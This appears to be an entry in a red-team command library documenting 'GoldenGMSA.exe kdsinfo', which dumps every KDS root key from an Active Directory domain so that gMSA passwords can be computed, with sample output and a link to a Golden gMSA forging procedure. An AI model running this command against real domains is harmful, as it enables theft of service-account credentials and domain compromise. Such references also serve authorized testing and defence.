---
id: 4c030b25-b3da-4093-b462-f96e0c38a487
name: golden-gmsa-dump-all-kds-root-keys
type: command
executor: bash
data: GoldenGMSA.exe kdsinfo
output: null
created_at: '2023-04-06T03:56:04.615431+00:00'
updated_at: '2023-04-10T20:25:56.697280+00:00'
platforms:
  - Windows
tags:
  - active-directory
  - key-dumping
verified: true
validated: true
---

# golden-gmsa-dump-all-kds-root-keys

## Command

```bash
GoldenGMSA.exe kdsinfo
```

## Description

Dumps all KDS root keys from the domain, providing Base64-encoded blobs needed for GMSA password computation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| kdsinfo | Subcommand to dump KDS keys | Yes |

## Examples

### Basic Usage

```bash
GoldenGMSA.exe kdsinfo
```

## Expected Output

List of keys:
```
GUID: 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb
Key: AQAAALm45UZXyuYB[...]G2/M=
```

## Related

- [[procedures/Forging-Golden-GMSA]]
- [[tools/GoldenGMSA]]
